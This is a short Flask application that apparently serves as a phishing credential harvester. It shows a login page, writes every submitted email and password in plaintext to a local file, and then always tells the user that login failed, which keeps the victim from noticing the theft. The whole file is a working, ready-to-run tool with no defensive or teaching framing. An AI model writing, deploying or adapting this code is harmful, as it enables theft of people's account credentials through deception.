from flask import Flask, request, render_template 
from datetime import datetime 
 
app = Flask(__name__) 
 
@app.route("/", methods=["GET", "POST"]) 
def login(): 
    if request.method == "POST": 
        email = request.form.get("email") 
        password = request.form.get("password") 
 
        with open("credentials.txt", "a") as file: 
            file.write(f"{datetime.now()} | Email: {email} | Password: {password}\n") 
 
        return "<h2>Login failed. Please try again later.</h2>" 
 
    return render_template("login.html") 
 
if __name__ == "__main__": 
    app.run(debug=True)